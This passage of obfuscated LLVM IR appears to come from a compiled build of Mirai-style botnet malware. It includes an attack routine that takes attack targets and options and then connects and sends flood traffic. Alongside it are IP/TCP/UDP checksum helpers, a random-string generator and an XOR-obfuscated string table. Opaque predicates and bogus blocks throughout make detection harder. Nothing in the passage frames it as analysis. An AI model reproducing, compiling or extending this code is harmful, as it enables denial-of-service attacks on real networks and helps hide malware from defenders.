  %323 = icmp eq i32 %322, 0
  %324 = icmp slt i32 %319, 10
  %325 = or i1 %323, %324
  br i1 %325, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %326

; <label>:326:                                    ; preds = %originalBBpart229
  %327 = load i32, i32* @x.37
  %328 = load i32, i32* @y.38
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %326
  %335 = load i32, i32* %19, align 4
  %336 = add nsw i32 %335, 1
  store i32 %336, i32* %19, align 4
  %337 = load i32, i32* @x.37
  %338 = load i32, i32* @y.38
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBBpart242, label %originalBB31alteredBB

originalBBpart242:                                ; preds = %originalBB31
  br label %279

; <label>:345:                                    ; preds = %279
  %346 = call i64 @time(i64* null) #6
  %347 = load i32, i32* %27, align 4
  %348 = sext i32 %347 to i64
  %349 = icmp sgt i64 %346, %348
  br i1 %349, label %350, label %351

; <label>:350:                                    ; preds = %345
  br label %352

; <label>:351:                                    ; preds = %345
  br label %278

; <label>:352:                                    ; preds = %350, %originalBBpart213
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %5
  %353 = alloca i32, align 4
  %354 = alloca i8, align 1
  %355 = alloca %struct.attack_target*, align 8
  %356 = alloca i8, align 1
  %357 = alloca %struct.attack_option*, align 8
  %358 = alloca i32, align 4
  %359 = alloca i8**, align 8
  %360 = alloca i32*, align 8
  %361 = alloca i16, align 2
  %362 = alloca i16, align 2
  %363 = alloca i16, align 2
  %364 = alloca i8, align 1
  %365 = alloca %struct.sockaddr_in, align 4
  %366 = alloca i32, align 4
  %367 = alloca %struct.iphdr*, align 8
  %368 = alloca %struct.udphdr*, align 8
  %369 = alloca i8*, align 8
  %370 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %371 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %372 = alloca i8*, align 8
  store i32 %0, i32* %353, align 4
  store i8 %1, i8* %354, align 1
  store %struct.attack_target* %2, %struct.attack_target** %355, align 8
  store i8 %3, i8* %356, align 1
  store %struct.attack_option* %4, %struct.attack_option** %357, align 8
  store i32 0, i32* %358, align 4
  %373 = load i8, i8* %354, align 1
  %374 = zext i8 %373 to i64
  %375 = call noalias i8* @calloc(i64 %374, i64 8) #6
  %376 = bitcast i8* %375 to i8**
  store i8** %376, i8*** %359, align 8
  %377 = load i8, i8* %354, align 1
  %378 = zext i8 %377 to i64
  %379 = call noalias i8* @calloc(i64 %378, i64 4) #6
  %380 = bitcast i8* %379 to i32*
  store i32* %380, i32** %360, align 8
  %381 = load i8, i8* %356, align 1
  %382 = load %struct.attack_option*, %struct.attack_option** %357, align 8
  %383 = call i32 @attack_get_opt_int(i8 zeroext %381, %struct.attack_option* %382, i8 zeroext 7, i32 65535)
  %384 = trunc i32 %383 to i16
  store i16 %384, i16* %361, align 2
  %385 = load i8, i8* %356, align 1
  %386 = load %struct.attack_option*, %struct.attack_option** %357, align 8
  %387 = call i32 @attack_get_opt_int(i8 zeroext %385, %struct.attack_option* %386, i8 zeroext 6, i32 65535)
  %388 = trunc i32 %387 to i16
  store i16 %388, i16* %362, align 2
  %389 = load i8, i8* %356, align 1
  %390 = load %struct.attack_option*, %struct.attack_option** %357, align 8
  %391 = call i32 @attack_get_opt_int(i8 zeroext %389, %struct.attack_option* %390, i8 zeroext 0, i32 512)
  %392 = trunc i32 %391 to i16
  store i16 %392, i16* %363, align 2
  %393 = load i8, i8* %356, align 1
  %394 = load %struct.attack_option*, %struct.attack_option** %357, align 8
  %395 = call i32 @attack_get_opt_int(i8 zeroext %393, %struct.attack_option* %394, i8 zeroext 1, i32 1)
  %396 = trunc i32 %395 to i8
  store i8 %396, i8* %364, align 1
  %397 = bitcast %struct.sockaddr_in* %365 to i8*
  call void @llvm.memset.p0i8.i64(i8* %397, i8 0, i64 16, i32 4, i1 false)
  %398 = call i64 @time(i64* null) #6
  %399 = load i32, i32* %353, align 4
  %400 = sext i32 %399 to i64
  %_ = sub i64 0, %398
  %gen = add i64 %_, %400
  %_1 = shl i64 %398, %400
  %_2 = shl i64 %398, %400
  %_3 = shl i64 %398, %400
  %_4 = shl i64 %398, %400
  %_5 = shl i64 %398, %400
  %_6 = shl i64 %398, %400
  %401 = add nsw i64 %398, %400
  %402 = trunc i64 %401 to i32
  store i32 %402, i32* %366, align 4
  %403 = load i16, i16* %362, align 2
  %404 = zext i16 %403 to i32
  %405 = icmp eq i32 %404, 65535
  br label %originalBB

originalBB7alteredBB:                             ; preds = %originalBB7, %78
  %406 = load i16, i16* %23, align 2
  %407 = call zeroext i16 @htons(i16 zeroext %406) #7
  store i16 %407, i16* %23, align 2
  br label %originalBB7

originalBB11alteredBB:                            ; preds = %originalBB11, %137
  br label %originalBB11

originalBB15alteredBB:                            ; preds = %originalBB15, %171
  br label %originalBB15

originalBB19alteredBB:                            ; preds = %originalBB19, %223
  %408 = load i32*, i32** %21, align 8
  %409 = load i32, i32* %19, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds i32, i32* %408, i64 %410
  %412 = load i32, i32* %411, align 4
  %413 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %414 = load %struct.attack_target*, %struct.attack_target** %16, align 8
  %415 = load i32, i32* %19, align 4
  %416 = sext i32 %415 to i64
  %417 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %414, i64 %416
  %418 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %417, i32 0, i32 0
  %419 = bitcast %struct.sockaddr_in* %418 to %struct.sockaddr*
  store %struct.sockaddr* %419, %struct.sockaddr** %413, align 8
  %420 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %421 = load %struct.sockaddr*, %struct.sockaddr** %420, align 8
  %422 = call i32 @connect(i32 %412, %struct.sockaddr* %421, i32 16)
  %423 = icmp eq i32 %422, -1
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %261
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %300
  %424 = load i32*, i32** %21, align 8
  %425 = load i32, i32* %19, align 4
  %426 = sext i32 %425 to i64
  %427 = getelementptr inbounds i32, i32* %424, i64 %426
  %428 = load i32, i32* %427, align 4
  %429 = load i8*, i8** %33, align 8
  %430 = load i16, i16* %24, align 2
  %431 = zext i16 %430 to i64
  %432 = call i64 @send(i32 %428, i8* %429, i64 %431, i32 16384)
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %326
  %433 = load i32, i32* %19, align 4
  %_32 = sub i32 0, %433
  %gen33 = add i32 %_32, 1
  %_34 = sub i32 %433, 1
  %gen35 = mul i32 %_34, 1
  %_36 = shl i32 %433, 1
  %_37 = shl i32 %433, 1
  %_38 = sub i32 0, %433
  %gen39 = add i32 %_38, 1
  %_40 = shl i32 %433, 1
  %434 = add nsw i32 %433, 1
  store i32 %434, i32* %19, align 4
  br label %originalBB31
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = load i32, i32* @x.39
  %4 = load i32, i32* @y.40
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i16*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  store i16* %0, i16** %11, align 8
  store i32 %1, i32* %12, align 4
  store i64 0, i64* %13, align 8
  store i64 0, i64* %13, align 8
  %14 = load i32, i32* @x.39
  %15 = load i32, i32* @y.40
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %22

; <label>:22:                                     ; preds = %originalBBpart26, %originalBBpart2
  %23 = load i32, i32* %12, align 4
  %24 = icmp ugt i32 %23, 1
  br i1 %24, label %25, label %51

; <label>:25:                                     ; preds = %22
  %26 = load i16*, i16** %11, align 8
  %27 = getelementptr inbounds i16, i16* %26, i32 1
  store i16* %27, i16** %11, align 8
  %28 = load i16, i16* %26, align 2
  %29 = zext i16 %28 to i64
  %30 = load i64, i64* %13, align 8
  %31 = add i64 %30, %29
  store i64 %31, i64* %13, align 8
  br label %32

; <label>:32:                                     ; preds = %25
  %33 = load i32, i32* @x.39
  %34 = load i32, i32* @y.40
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  %41 = load i32, i32* %12, align 4
  %42 = sub i32 %41, 2
  store i32 %42, i32* %12, align 4
  %43 = load i32, i32* @x.39
  %44 = load i32, i32* @y.40
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBBpart26, label %originalBB1alteredBB

originalBBpart26:                                 ; preds = %originalBB1
  br label %22

; <label>:51:                                     ; preds = %22
  %52 = load i32, i32* %12, align 4
  %53 = icmp eq i32 %52, 1
  br i1 %53, label %54, label %61

; <label>:54:                                     ; preds = %51
  %55 = load i16*, i16** %11, align 8
  %56 = load i16, i16* %55, align 2
  %57 = trunc i16 %56 to i8
  %58 = sext i8 %57 to i64
  %59 = load i64, i64* %13, align 8
  %60 = add i64 %59, %58
  store i64 %60, i64* %13, align 8
  br label %61

; <label>:61:                                     ; preds = %54, %51
  %62 = load i64, i64* %13, align 8
  %63 = lshr i64 %62, 16
  %64 = load i64, i64* %13, align 8
  %65 = and i64 %64, 65535
  %66 = add i64 %63, %65
  store i64 %66, i64* %13, align 8
  %67 = load i64, i64* %13, align 8
  %68 = lshr i64 %67, 16
  %69 = load i64, i64* %13, align 8
  %70 = add i64 %69, %68
  store i64 %70, i64* %13, align 8
  %71 = load i64, i64* %13, align 8
  %72 = xor i64 %71, -1
  %73 = trunc i64 %72 to i16
  ret i16 %73

originalBBalteredBB:                              ; preds = %originalBB, %2
  %74 = alloca i16*, align 8
  %75 = alloca i32, align 4
  %76 = alloca i64, align 8
  store i16* %0, i16** %74, align 8
  store i32 %1, i32* %75, align 4
  store i64 0, i64* %76, align 8
  store i64 0, i64* %76, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  %77 = load i32, i32* %12, align 4
  %_ = sub i32 0, %77
  %gen = add i32 %_, 2
  %_2 = shl i32 %77, 2
  %_3 = sub i32 %77, 2
  %gen4 = mul i32 %_3, 2
  %78 = sub i32 %77, 2
  store i32 %78, i32* %12, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %42, %4
  %24 = load i32, i32* @x.41
  %25 = load i32, i32* @y.42
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %23
  %32 = load i32, i32* %8, align 4
  %33 = icmp sgt i32 %32, 1
  %34 = load i32, i32* @x.41
  %35 = load i32, i32* @y.42
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %33, label %42, label %52

; <label>:42:                                     ; preds = %originalBBpart2
  %43 = load i16*, i16** %9, align 8
  %44 = load i16, i16* %43, align 2
  %45 = zext i16 %44 to i32
  %46 = load i32, i32* %12, align 4
  %47 = add i32 %46, %45
  store i32 %47, i32* %12, align 4
  %48 = load i16*, i16** %9, align 8
  %49 = getelementptr inbounds i16, i16* %48, i32 1
  store i16* %49, i16** %9, align 8
  %50 = load i32, i32* %8, align 4
  %51 = sub nsw i32 %50, 2
  store i32 %51, i32* %8, align 4
  br label %23

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i32, i32* @x.41
  %54 = load i32, i32* @y.42
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  %61 = load i32, i32* %8, align 4
  %62 = icmp eq i32 %61, 1
  %63 = load i32, i32* @x.41
  %64 = load i32, i32* @y.42
  %65 = sub i32 %63, 1
  %66 = mul i32 %63, %65
  %67 = urem i32 %66, 2
  %68 = icmp eq i32 %67, 0
  %69 = icmp slt i32 %64, 10
  %70 = or i1 %68, %69
  br i1 %70, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %62, label %71, label %94

; <label>:71:                                     ; preds = %originalBBpart24
  %72 = load i32, i32* @x.41
  %73 = load i32, i32* @y.42
  %74 = sub i32 %72, 1
  %75 = mul i32 %72, %74
  %76 = urem i32 %75, 2
  %77 = icmp eq i32 %76, 0
  %78 = icmp slt i32 %73, 10
  %79 = or i1 %77, %78
  br i1 %79, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %71
  %80 = load i16*, i16** %9, align 8
  %81 = bitcast i16* %80 to i8*
  %82 = load i8, i8* %81, align 1
  %83 = zext i8 %82 to i32
  %84 = load i32, i32* %12, align 4
  %85 = add i32 %84, %83
  store i32 %85, i32* %12, align 4
  %86 = load i32, i32* @x.41
  %87 = load i32, i32* @y.42
  %88 = sub i32 %86, 1
  %89 = mul i32 %86, %88
  %90 = urem i32 %89, 2
  %91 = icmp eq i32 %90, 0
  %92 = icmp slt i32 %87, 10
  %93 = or i1 %91, %92
  br i1 %93, label %originalBBpart211, label %originalBB6alteredBB

originalBBpart211:                                ; preds = %originalBB6
  br label %94

; <label>:94:                                     ; preds = %originalBBpart211, %originalBBpart24
  %95 = load i32, i32* %10, align 4
  %96 = lshr i32 %95, 16
  %97 = and i32 %96, 65535
  %98 = load i32, i32* %12, align 4
  %99 = add i32 %98, %97
  store i32 %99, i32* %12, align 4
  %100 = load i32, i32* %10, align 4
  %101 = and i32 %100, 65535
  %102 = load i32, i32* %12, align 4
  %103 = add i32 %102, %101
  store i32 %103, i32* %12, align 4
  %104 = load i32, i32* %11, align 4
  %105 = lshr i32 %104, 16
  %106 = and i32 %105, 65535
  %107 = load i32, i32* %12, align 4
  %108 = add i32 %107, %106
  store i32 %108, i32* %12, align 4
  %109 = load i32, i32* %11, align 4
  %110 = and i32 %109, 65535
  %111 = load i32, i32* %12, align 4
  %112 = add i32 %111, %110
  store i32 %112, i32* %12, align 4
  %113 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i32 0, i32 6
  %115 = load i8, i8* %114, align 1
  %116 = zext i8 %115 to i16
  %117 = call zeroext i16 @htons(i16 zeroext %116) #7
  %118 = zext i16 %117 to i32
  %119 = load i32, i32* %12, align 4
  %120 = add i32 %119, %118
  store i32 %120, i32* %12, align 4
  %121 = load i16, i16* %7, align 2
  %122 = zext i16 %121 to i32
  %123 = load i32, i32* %12, align 4
  %124 = add i32 %123, %122
  store i32 %124, i32* %12, align 4
  br label %125

; <label>:125:                                    ; preds = %129, %94
  %126 = load i32, i32* %12, align 4
  %127 = lshr i32 %126, 16
  %128 = icmp ne i32 %127, 0
  br i1 %128, label %129, label %135

; <label>:129:                                    ; preds = %125
  %130 = load i32, i32* %12, align 4
  %131 = and i32 %130, 65535
  %132 = load i32, i32* %12, align 4
  %133 = lshr i32 %132, 16
  %134 = add i32 %131, %133
  store i32 %134, i32* %12, align 4
  br label %125

; <label>:135:                                    ; preds = %125
  %136 = load i32, i32* %12, align 4
  %137 = xor i32 %136, -1
  %138 = trunc i32 %137 to i16
  ret i16 %138

originalBBalteredBB:                              ; preds = %originalBB, %23
  %139 = load i32, i32* %8, align 4
  %140 = icmp sgt i32 %139, 1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %52
  %141 = load i32, i32* %8, align 4
  %142 = icmp eq i32 %141, 1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %71
  %143 = load i16*, i16** %9, align 8
  %144 = bitcast i16* %143 to i8*
  %145 = load i8, i8* %144, align 1
  %146 = zext i8 %145 to i32
  %147 = load i32, i32* %12, align 4
  %_ = sub i32 %147, %146
  %gen = mul i32 %_, %146
  %_7 = sub i32 %147, %146
  %gen8 = mul i32 %_7, %146
  %_9 = shl i32 %147, %146
  %148 = add i32 %147, %146
  store i32 %148, i32* %12, align 4
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = load i32, i32* @x.43
  %2 = load i32, i32* @y.44
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = load i32, i32* @x, align 4
  store i32 %10, i32* %9, align 4
  %11 = load i32, i32* %9, align 4
  %12 = shl i32 %11, 11
  %13 = load i32, i32* %9, align 4
  %14 = xor i32 %13, %12
  store i32 %14, i32* %9, align 4
  %15 = load i32, i32* %9, align 4
  %16 = lshr i32 %15, 8
  %17 = load i32, i32* %9, align 4
  %18 = xor i32 %17, %16
  store i32 %18, i32* %9, align 4
  %19 = load i32, i32* @y, align 4
  store i32 %19, i32* @x, align 4
  %20 = load i32, i32* @z, align 4
  store i32 %20, i32* @y, align 4
  %21 = load i32, i32* @w, align 4
  store i32 %21, i32* @z, align 4
  %22 = load i32, i32* @w, align 4
  %23 = lshr i32 %22, 19
  %24 = load i32, i32* @w, align 4
  %25 = xor i32 %24, %23
  store i32 %25, i32* @w, align 4
  %26 = load i32, i32* %9, align 4
  %27 = load i32, i32* @w, align 4
  %28 = xor i32 %27, %26
  store i32 %28, i32* @w, align 4
  %29 = load i32, i32* @w, align 4
  %30 = load i32, i32* @x.43
  %31 = load i32, i32* @y.44
  %32 = sub i32 %30, 1
  %33 = mul i32 %30, %32
  %34 = urem i32 %33, 2
  %35 = icmp eq i32 %34, 0
  %36 = icmp slt i32 %31, 10
  %37 = or i1 %35, %36
  br i1 %37, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %29

originalBBalteredBB:                              ; preds = %originalBB, %0
  %38 = alloca i32, align 4
  %39 = load i32, i32* @x, align 4
  store i32 %39, i32* %38, align 4
  %40 = load i32, i32* %38, align 4
  %_ = shl i32 %40, 11
  %_1 = sub i32 %40, 11
  %gen = mul i32 %_1, 11
  %_2 = sub i32 %40, 11
  %gen3 = mul i32 %_2, 11
  %_4 = sub i32 %40, 11
  %gen5 = mul i32 %_4, 11
  %_6 = shl i32 %40, 11
  %_7 = sub i32 %40, 11
  %gen8 = mul i32 %_7, 11
  %_9 = shl i32 %40, 11
  %41 = shl i32 %40, 11
  %42 = load i32, i32* %38, align 4
  %_10 = sub i32 0, %42
  %gen11 = add i32 %_10, %41
  %_12 = sub i32 0, %42
  %gen13 = add i32 %_12, %41
  %_14 = sub i32 %42, %41
  %gen15 = mul i32 %_14, %41
  %43 = xor i32 %42, %41
  store i32 %43, i32* %38, align 4
  %44 = load i32, i32* %38, align 4
  %_16 = sub i32 %44, 8
  %gen17 = mul i32 %_16, 8
  %45 = lshr i32 %44, 8
  %46 = load i32, i32* %38, align 4
  %_18 = sub i32 %46, %45
  %gen19 = mul i32 %_18, %45
  %_20 = sub i32 %46, %45
  %gen21 = mul i32 %_20, %45
  %_22 = sub i32 0, %46
  %gen23 = add i32 %_22, %45
  %47 = xor i32 %46, %45
  store i32 %47, i32* %38, align 4
  %48 = load i32, i32* @y, align 4
  store i32 %48, i32* @x, align 4
  %49 = load i32, i32* @z, align 4
  store i32 %49, i32* @y, align 4
  %50 = load i32, i32* @w, align 4
  store i32 %50, i32* @z, align 4
  %51 = load i32, i32* @w, align 4
  %_24 = shl i32 %51, 19
  %52 = lshr i32 %51, 19
  %53 = load i32, i32* @w, align 4
  %_25 = sub i32 0, %53
  %gen26 = add i32 %_25, %52
  %_27 = shl i32 %53, %52
  %_28 = sub i32 %53, %52
  %gen29 = mul i32 %_28, %52
  %54 = xor i32 %53, %52
  store i32 %54, i32* @w, align 4
  %55 = load i32, i32* %38, align 4
  %56 = load i32, i32* @w, align 4
  %_30 = shl i32 %56, %55
  %_31 = sub i32 0, %56
  %gen32 = add i32 %_31, %55
  %57 = xor i32 %56, %55
  store i32 %57, i32* @w, align 4
  %58 = load i32, i32* @w, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = load i32, i32* @x.45
  %4 = load i32, i32* @y.46
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca [32 x i8], align 16
  store i8* %0, i8** %11, align 8
  store i32 %1, i32* %12, align 4
  call void @table_unlock_val(i8 zeroext 61)
  %14 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i32 0, i32 0
  %15 = call i8* @table_retrieve_val(i32 61, i32* null)
  %16 = call i8* @strcpy(i8* %14, i8* %15) #6
  %17 = load i32, i32* @x.45
  %18 = load i32, i32* @y.46
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %25

; <label>:25:                                     ; preds = %29, %originalBBpart2
  %26 = load i32, i32* %12, align 4
  %27 = add nsw i32 %26, -1
  store i32 %27, i32* %12, align 4
  %28 = icmp ne i32 %26, 0
  br i1 %28, label %29, label %39

; <label>:29:                                     ; preds = %25
  %30 = call i32 @rand_next()
  %31 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i32 0, i32 0
  %32 = call i32 @util_strlen(i8* %31)
  %33 = urem i32 %30, %32
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds [32 x i8], [32 x i8]* %13, i64 0, i64 %34
  %36 = load i8, i8* %35, align 1
  %37 = load i8*, i8** %11, align 8
  %38 = getelementptr inbounds i8, i8* %37, i32 1
  store i8* %38, i8** %11, align 8
  store i8 %36, i8* %37, align 1
  br label %25

; <label>:39:                                     ; preds = %25
  %40 = load i32, i32* @x.45
  %41 = load i32, i32* @y.46
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %39
  call void @table_lock_val(i8 zeroext 61)
  %48 = load i32, i32* @x.45
  %49 = load i32, i32* @y.46
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %2
  %56 = alloca i8*, align 8
  %57 = alloca i32, align 4
  %58 = alloca [32 x i8], align 16
  store i8* %0, i8** %56, align 8
  store i32 %1, i32* %57, align 4
  call void @table_unlock_val(i8 zeroext 61)
  %59 = getelementptr inbounds [32 x i8], [32 x i8]* %58, i32 0, i32 0
  %60 = call i8* @table_retrieve_val(i32 61, i32* null)
  %61 = call i8* @strcpy(i8* %59, i8* %60) #6
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %39
  call void @table_lock_val(i8 zeroext 61)
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

; <label>:27:                                     ; preds = %originalBBpart2, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %102

; <label>:34:                                     ; preds = %27
  %35 = load i8, i8* %5, align 1
  %36 = zext i8 %35 to i32
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %3, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = xor i32 %44, %36
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %42, align 1
  %47 = load i8, i8* %6, align 1
  %48 = zext i8 %47 to i32
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
